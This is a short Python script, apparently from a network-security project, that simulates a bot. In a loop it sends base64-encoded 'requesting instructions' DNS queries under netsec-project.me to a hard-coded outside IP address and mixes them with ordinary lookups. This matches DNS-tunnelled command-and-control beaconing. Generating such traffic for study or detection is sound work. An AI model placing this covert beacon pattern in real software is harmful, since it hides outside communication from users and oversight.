# Periodically makes malicious queries (i.e., acts like bot)

import dns
import socket
import sys
import datetime
from dns import name
from dns import message
from dns import query
import dnslib
from dnslib import RR, DNSRecord, DNSQuestion, QTYPE
import textwrap
import binascii
import base64
import time

#SERVER_IP = '18.213.140.149'
#SERVER_PORT = 50007

SERVER_IP   = '1.1.1.1'
SERVER_PORT = 53
BUFFER_SIZE = 1024

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM);

def non():
    query = DNSRecord.question("google.com", "CNAME")
    sock.sendto(query.pack(), ("1.1.1.1", 53))
    data, addr = sock.recvfrom(1024)

    query = DNSRecord.question("pandas.pydata.org")
    sock.sendto(query.pack(), ("1.1.1.1", 53))
    data, addr = sock.recvfrom(1024)

def malicious():

    query = DNSRecord.question("cmVxdWVzdGluZyBpbnN0cnVjdGlvbnM0.netsec-project.me", "CNAME")
    sock.sendto(query.pack(), ("18.213.140.149", 53))


    data, addr = sock.recvfrom(1024)
    query = DNSRecord.parse(data) # parse packet into


def main():

    while(1):
        malicious()
        non()

        time.sleep(8)


if __name__=="__main__":
    main()
